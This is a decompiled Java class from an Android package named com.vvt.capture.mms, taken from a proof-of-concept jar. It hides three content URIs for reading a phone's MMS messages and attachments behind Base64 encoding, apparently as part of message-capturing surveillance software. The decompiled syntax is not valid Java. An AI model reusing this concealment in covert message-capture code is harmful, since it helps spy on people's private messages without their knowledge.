package com.vvt.capture.mms.b;

import android.net.Uri;
import android.util.Base64;

public class a
{
  public static final Uri a;
  public static final Uri b;
  public static final Uri c;
  
  static
  {
    String str = new java/lang/String;
    byte[] arrayOfByte = Base64.decode("Y29udGVudDovL21tcy1zbXM=", 0);
    str.<init>(arrayOfByte);
    a = Uri.parse(str);
    str = new java/lang/String;
    arrayOfByte = Base64.decode("Y29udGVudDovL21tcw==", 0);
    str.<init>(arrayOfByte);
    b = Uri.parse(str);
    str = new java/lang/String;
    arrayOfByte = Base64.decode("Y29udGVudDovL21tcy9wYXJ0", 0);
    str.<init>(arrayOfByte);
    c = Uri.parse(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/mms/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */